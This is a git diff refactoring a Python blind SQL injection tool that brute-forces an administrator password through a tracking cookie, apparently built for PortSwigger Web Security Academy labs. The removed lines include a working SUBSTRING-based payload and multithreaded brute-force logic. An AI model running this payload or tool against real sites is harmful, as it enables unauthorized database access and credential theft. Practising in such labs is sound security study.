@@ -1,106 +1,24 @@
 #!/usr/bin/env python3.12
-# cookie_injector.py ver 1.1
+# cookie_injector.py
 
 import datetime
-import http.client
 import json
 import sys
 from collections import OrderedDict
 from concurrent.futures import ThreadPoolExecutor
-from queue import Queue
 
 import click
-import requests
 from rich.console import Console
-from rich.live import Live
 from rich.markdown import Markdown
-from rich.panel import Panel
 
-from SQLInjector.brute_forcer import BruteForcer
-from SQLInjector.cookie_injector_core import CookieInjector
-
-# url = "https://0a6c002f031d991d81c225db00ea0044.web-security-academy.net/product?productId=13"
-#
-# code_to_inject = (
-#     "' anD (SELECT SUBSTRING(password,{char_numb},1) FROM users WHERE username = 'administrator') = '{character}'--",
-# )[0]
-#
-# password_length = 20
-# payload_character_set = [letter for letter in string.ascii_letters] + [num for num in range(0, 10)]
-# confirmation_string = b"Welcome"
-# cookie = "TrackingId"
-
-# threads = 20
-# queues = [Queue() for queue in range(threads)]
-
-
-class Injector:
-    def __init__(self, target_url, confirm_string, cookie_name, passwd_length: int, char_set, inject_code,
-                 max_threads: int):
-        self.c = Console()
-        self.url = target_url
-        self.confirm_string = confirm_string
-        self.cookie_name = cookie_name
-        self.passwd_length = passwd_length
-        self.char_set = char_set
-        self.inject_code = inject_code
-        self.max_threads = max_threads
-        self.queues = [Queue() for _queue in range(self.max_threads)]
-        self.found_characters = {}
-        self.discard_seq_num = []
-        self.debug_skipped = []
-        self.status_code_to_description = {}
-
-    def check_url(self):
-        self.status_code_to_description = {code: description for code, description in http.client.responses.items()}
-        try:
-            response = requests.head(self.url)
-            if response.status_code == 200:
-                self.c.print(f"The URL is responding", style="green")
-            self.c.print(
-                f"Status code {response.status_code} -> {self.status_code_to_description[response.status_code]}.\n"
-                f"Press CTRL+C to abort."
-            )
-        except requests.RequestException as e:
-            self.c.print(f"Error: {e}")
-            print()
-            self.c.print(f"The URL {self.url} is not responding.", style="red")
-            sys.exit(1)
-
-    def brute_forcer(self):
-        bf = BruteForcer(self.passwd_length, self.char_set, self.inject_code)
-        for i, payload_kit in enumerate(bf.brute_force()):
-            thread_id = i % self.max_threads
-            self.queues[thread_id].put(payload_kit)
-
-    def cookie_injector(self, inject_code, seq_num, char, start_time):
-        if seq_num not in self.discard_seq_num:
-            cookie_injector = CookieInjector(self.url, self.confirm_string, self.cookie_name)
-            char_found = cookie_injector.run(inject_code, seq_num, char)
-            if char_found:
-                self.found_characters[f"Char {seq_num}"] = char
-                self.discard_seq_num.append(seq_num)
-                now = datetime.datetime.now()
-                elapsed_time = now - start_time
-                with Live():
-                    self.c.print(
-                        Panel(
-                            f"{self.found_characters}\n"
-                            f"Brute forced positions {len(self.discard_seq_num)} --> {self.discard_seq_num}\n"
-                            f"Time elapsed {elapsed_time}",
-                            title="Found Char",
-                            title_align="left",
-                            highlight=True
-                        )
-                    )
-        else:
-            pass
+from SQLInjector.injector import Injector
 
 
 class StartInjector:
     def __init__(self, set_url, config_file_path, out_file, setup_utility):
         self.c = Console()
         self.futures = []
+        self.future = None
         self.start_time = None
         self.set_url = set_url
         self.config_file_path = config_file_path
@@ -146,20 +64,22 @@ class StartInjector:
     def thread_pool_executor(self, max_threads: int, passwd_length: int) -> None:
         with ThreadPoolExecutor(max_workers=max_threads) as executor:
             for thread_id, working_queue in enumerate(self.injector.queues):
+                if self.future is not None:
+                    if self.future.cancelled():
+                        self.kill_all_threads()
                 while not working_queue.empty():
-                    if len(self.injector.discard_seq_num) != passwd_length:
+                    if len(self.injector.discard_seq_num) < passwd_length:
                         payload = working_queue.get()
-                        future = executor.submit(
+                        self.future = executor.submit(
                             self.injector.cookie_injector,
                             payload.inject_code,
                             payload.sequence_num,
                             payload.character,
                             self.start_time
                         )
-                        self.futures.append(future)
+                        self.futures.append(self.future)
                     else:
                         self.kill_all_threads()
-                        break
 
     def process_char_dict(self) -> str:
         found_characters = self.injector.found_characters
@@ -212,6 +132,11 @@ class StartInjector:
     def kill_all_threads(self):
         for future in self.futures:
             future.cancel()
+        for future in self.futures:
+            try:
+                future.result()
+            except Exception as e:
+                pass
         self.futures = []
 
     def start_threads(self):
